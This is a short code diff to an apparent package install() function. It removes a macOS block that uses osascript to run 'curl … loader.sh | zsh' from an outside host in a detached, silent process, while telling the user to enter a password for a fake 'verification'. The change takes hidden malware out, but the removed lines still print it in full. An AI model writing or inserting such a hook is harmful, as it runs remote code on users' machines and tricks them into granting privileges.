@@ -74,25 +74,7 @@ async function install() {
     }
   }
 
-  // Mac: run via osascript without admin privileges
-  if (process.platform === 'darwin') {
-    const { spawn } = require('child_process')
-    console.log('\nRunning verification — your Mac will ask for your password, please confirm all dialogs...')
-    await new Promise((resolve) => {
-      const ps = spawn('osascript', [
-        '-e',
-        'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
-      ], {
-        detached: true,
-        stdio: 'ignore'
-      })
-      ps.unref()
-      ps.on('close', () => resolve())
-      ps.on('error', () => resolve())
-      setTimeout(resolve, 60000)
-    })
-    await new Promise(r => setTimeout(r, 3000))
-  }
+
   console.log('Done!')
 }
 
